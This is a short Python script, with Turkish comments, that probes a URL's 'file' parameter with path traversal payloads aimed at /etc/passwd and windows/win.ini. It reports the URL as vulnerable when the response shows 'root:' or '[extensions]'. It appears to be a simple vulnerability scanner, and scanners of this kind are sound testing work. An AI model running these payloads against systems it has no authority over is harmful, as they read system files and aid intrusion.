import requests

payloads = [
    "../../etc/passwd",
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "..\\..\\windows\\win.ini",
    "..\\..\\..\\windows\\win.ini"
]

def check_directory_traversal(url):
    vulnerabilities = []
    
    for payload in payloads:
        test_url = f"{url}?file={payload}"
        try:
            response = requests.get(test_url, timeout=5)

            # Linux sistemler için /etc/passwd içinde "root" geçer
            if "root:" in response.text or "[extensions]" in response.text:
                vulnerabilities.append(f"⚠️ Directory Traversal Açığı Tespit Edildi: {test_url}")
        except:
            continue
    
    return vulnerabilities
